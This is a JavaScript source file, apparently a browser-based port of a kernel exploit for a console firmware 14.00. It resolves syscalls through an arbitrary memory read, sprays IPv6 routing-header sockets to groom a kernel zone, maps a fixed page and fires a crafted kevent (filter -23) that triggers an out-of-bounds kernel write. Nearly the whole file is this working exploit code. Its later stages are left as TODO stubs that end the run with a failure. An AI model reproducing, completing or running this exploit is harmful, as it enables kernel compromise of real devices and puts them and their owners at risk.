import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";

// ============================================================================
// hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
// Bug: kevent(filter=-23) -> OOB in kernel filter-ops table -> 8-byte write
// into a groomed zone-256 object -> fakeops pivot -> kernel R/W.
// Maps: ac(u,NUM,..)=ctx.sc(NUM,..) | Unsafe getLong/putLong=ctx.p.read8/write8
//       dlf=dynsym lookup (ELF parse via arbitrary read)
// Checkpoint logs mirror the original exploit's own strings.
// ============================================================================

const T = HX1400_TABLES;
const P = T.P;

const NUM = {
  close: 6, read: 3, write: 4,
  socket: 97, bind: 104, listen: 106, accept: 30,
  setsockopt: 105, getsockopt: 118, ioctl: 54,
  kqueue: 362, kevent: 363, mmap: 477,
  jitshm_create: 533, fcntl: 92,
};
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;              // zone-256 arm
const GIDENT_LO = 0x4146424f;     // gIDENTJ = 0x313434314146424F
const GIDENT_HI = 0x31343431;
const EV_ADD = 1;

const STATE = { ctx: null, kbase: 0n, natives: {}, fdlog: [] };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) {
  if (typeof v === "bigint") return "0x" + v.toString(16);
  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
  return "0x" + Number(v).toString(16);
}
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function kptr(v) {
  v = num(v);
  return v > 0xffff000000000000n;
}
function ka(rva) {  // kbase + rva
  return STATE.kbase + BigInt(rva >>> 0);
}
function sc6(n, a, b, c, d, e, f) {
  return ctx().sc(n, toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)).i32;
}

// ---------- dynsym lookup in libkernel (ported dlf) ----------
function resolveNative(name) {
  const c = ctx();
  const B = c.libkernelBase;           // int64
  const rd4 = (a) => c.p.read4(toI64(a)) >>> 0;
  const rd8 = (a) => num(c.p.read8(toI64(a)));
  if (!STATE._elf) {
    const inRange = (v) => {
      if (v === null) return false;
      const n = num(v);
      const base = num(B);
      return n >= base && n < base + BigInt(0x4000000);
    };
    const phoff = rd8(B.add32(0x20));
    const phentsize = rd4(B.add32(0x36)) & 0xffff;
    const phnum = rd4(B.add32(0x38)) & 0xffff;
    log("ELF-HDR", "base=" + h16(B) + " phoff=" + h16(phoff) + " entsz=" + phentsize + " phnum=" + phnum);
    let dynV = null;
    for (let k = 0; k < phnum; k++) {
      const ph = num(B) + phoff + BigInt(k * phentsize);
      if (rd4(ph) === 2) { dynV = rd8(ph + 0x10n); break; }
    }
    log("ELF-DYN", "dynV=" + h16(dynV));
    if (!inRange(dynV)) fin("PT_DYNAMIC not found/plausible");
    let strV = null, symV = null, hashV = null, symEnt = 24;
    for (let k = 0; k < 4096; k++) {
      const tag = rd8(dynV + BigInt(k * 16));
      const val = rd8(dynV + BigInt(k * 16 + 8));
      if (tag === 0n) break;
      if (tag === 5n) strV = val;
      else if (tag === 6n) symV = val;
      else if (tag === 4n) hashV = val;
      else if (tag === 11n) symEnt = Number(val);
    }
    log("ELF-TABS", "str=" + h16(strV) + " sym=" + h16(symV) + " hash=" + h16(hashV) +
        " symEnt=" + symEnt +
        " range=" + [strV, symV, hashV].map((v) => inRange(v)).join(","));
    if (!inRange(strV) || !inRange(symV) || !inRange(hashV))
      fin("dynamic tabs not plausible");
    STATE._elf = { strV, symV, hashV, symEnt };
  }
  const { strV, symV, hashV, symEnt } = STATE._elf;
  let h = 0;
  for (let i = 0; i < name.length; i++) h = (h << 4) + name.charCodeAt(i);
  const g = h & 0xf0000000; if (g) h ^= g >>> 24; h &= ~g;
  const nbucket = rd4(num(B) + hashV);
  let idx = rd4(num(B) + hashV + 8n + BigInt((h % nbucket) * 4));
  let guard = 0;
  while (idx !== 0 && guard++ < 4096) {
    const sym = num(B) + symV + BigInt(idx * symEnt);
    let s = "", off = rd4(sym);
    for (let i = 0; i < 64; i++) {
      const ch = c.p.read1(toI64(num(B) + strV + BigInt(off + i)));
      if (ch === 0) break;
      s += String.fromCharCode(ch);
    }
    if (s === name) {
      const stub = num(B) + rd8(sym + 8n);
      const sv = c.p.read8(toI64(stub));
      const sn = ((num(sv) & 0xffffffffn) >> 24n) | ((num(sv) >> 56n) << 8n);
      return { stub: toI64(stub), num: Number(sn & 0xffffffffn) };
    }
    idx = rd4(num(B) + hashV + 8n + BigInt(nbucket * 4 + idx * 4));
  }
  return null;
}

function resolveNatives() {
  const need = ["socket","bind","listen","accept","close","setsockopt","getsockopt",
                "ioctl","kqueue","kevent","mmap","munmap","jitshm_create","read","write","fcntl"];
  for (const nm of need) {
    const r = resolveNative(nm);
    if (!r) fin("native missing: " + nm);
    STATE.natives[nm] = r;
  }
  log("NATIVES", need.map((n) => n + "=" + STATE.natives[n].num).join(" "));
}

function scn(name, a, b, c, d, e, f) {
  const n = STATE.natives[name];
  return ctx().callAddr(n.stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}

// ---------- arena ----------
const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function put64(buf, off, v) { buf.dv.setUint32(off, Number(num(v) & 0xffffffffn), true); buf.dv.setUint32(off + 4, Number((num(v) >> 32n) & 0xffffffffn), true); }
function put32(buf, off, v) { buf.dv.setUint32(off, v >>> 0, true); }
function put16(buf, off, v) { buf.dv.setUint16(off, v & 0xffff, true); }

// ---------- node chains (0x38 nodes, RTHDR-exploit style) ----------
// node: {dec64, sink64, M64, 0, 0, 0, next64}
const NODE_SZ = 0x38;
function buildNodes(buf, list) {
  // list: [{dec, sink, next_idx|-1}]  next_idx relative into same buf
  const base = buf.addr;
  for (let i = 0; i < list.length; i++) {
    const o = i * NODE_SZ, nd = list[i];
    put64(buf, o + 0x00, nd.dec);
    put64(buf, o + 0x08, nd.sink);
    put64(buf, o + 0x10, 0);            // M (marker page), set by caller if needed
    put64(buf, o + 0x30, nd.next_idx < 0 ? 0 : base + BigInt((nd.next_idx) * NODE_SZ));
  }
}

// ---------- phases ----------
function phaseSpray(N) {
  const c = ctx();
  const rth = allocBuf(512);
  const fds = [];
  for (let i = 0; i < N; i++) {
    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
    if (fd <= 0) break;
    fds.push(fd);
    STATE.fdlog.push(fd);
  }
  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
  log("SPRAY", "sockets=" + fds.length);
  // arm each: setsockopt(fd, 41, 51, rthdr, 248)  [zone-256]
  for (const fd of fds) {
    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
  }
  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
  return { fds, rth };
}

function phaseLeakKq() {
  const cl = allocBuf(64);
  const kq = scn("kqueue");
  if (kq < 0) fin("leak kqueue");
  STATE.leakKq = kq;
  return { cl, kq };
}

function fireKevent(kq, cl, ident) {
  // changelist: ident@0, filter=-23 (short@8), EV_ADD (short@10)
  for (let i = 0; i < 8; i++) put64(cl, i * 8, 0);
  put64(cl, 0x00, ident);
  put16(cl, 0x08, -23);
  put16(cl, 0x0A, EV_ADD);
  const rc = scn("kevent", kq, cl.addr, 1, 0, 0, 0);
  log("KEVENT-23", "kq=" + kq + " rc=" + rc + " ident=" + h16(ident));
  if (rc !== 0) fin("leak ev-add rc=" + rc + " errno=" + ctx().errno());
  return rc;
}

// placeholder: remaining setup ported in next pass
function TODO(where) { fin("TODO: " + where + " (next port pass)"); }

export async function runKevent(c) {
  STATE.ctx = c;
  // kbase comes from the hx route-leak phase (milestone2). Passed via ctx.
  if (!c.kbase) fin("kbase not provided - run route leak first");
  STATE.kbase = num(c.kbase);
  log("KEVENT-PORT", "kbase=" + h16(STATE.kbase));

  resolveNatives();

  // ---- original order: natives -> arena -> victims/anchor -> spray -> mmap ----
  const scratch16a = allocBuf(16), scratch16b = allocBuf(16);
  const buf32k = allocBuf(32768);
  const buf200 = allocBuf(200);
  const rth = allocBuf(512);
  const cl = allocBuf(64);
  log("ARENA", "blocks allocated");

  // victims + anchor sockets opened BEFORE the spray (original: istore 161/163)
  const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
  const victimCount = 8;                 // TODO: confirm victim count/order from unread region
  const victims = [];
  for (let i = 0; i < victimCount; i++) {
    const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
    victims.push(fd);
    STATE.fdlog.push(fd);
  }
  log("VICTIMS", "anchor=" + anchorFd + " victims=" + victims.join(","));

  const { fds } = phaseSpray(256);

  // mmap fixed page for the walk-arena (original pc 6913: align to 16k, MAP_FIXED)
  const raw = num(ctx().bufAddr(new ArrayBuffer(16384)));  // any addr to align from
  const page = raw & ~0x3fffn;
  const mr = scn("mmap", page, 16384, 3, 4114, -1, 0);
  log("MMAP-FIXED", "want=" + h16(page) + " got=" + h16(mr));
  if (mr !== page) fin("mmap fixed " + h16(mr));
  const arena = { addr: page, dv: null };

  // ---- leak: EV_ADD -23 -> kernel walks -> marker in arena -> kva ----
  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");
  fireKevent(leakKq, cl, (BigInt(GIDENT_HI) << 32n) | BigInt(GIDENT_LO));

  // scan victims: getsockopt(fd, 0, 72, scratch+12, 8) then arena[+80]/[+56]
  // original expects int at arena+56 == 2 and kptr at arena+80
  TODO("node-walk builder + victim kva scan (region pc 7000-7700)");

  // ---- E-gadget readback verify + cSlotA/cOpsV ----
  log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
  TODO("E-gadget chains + readback (region pc 7950-8368)");

  // ---- root kqueue: initial EV_ADD -23 (hook) ----
  TODO("root kqueue hook (region pc 9000-9300)");

  log("KEVENT-STAGE1-PARTIAL", "phases through mmap+leak-fire ported; continuation pending");
  return false;
}
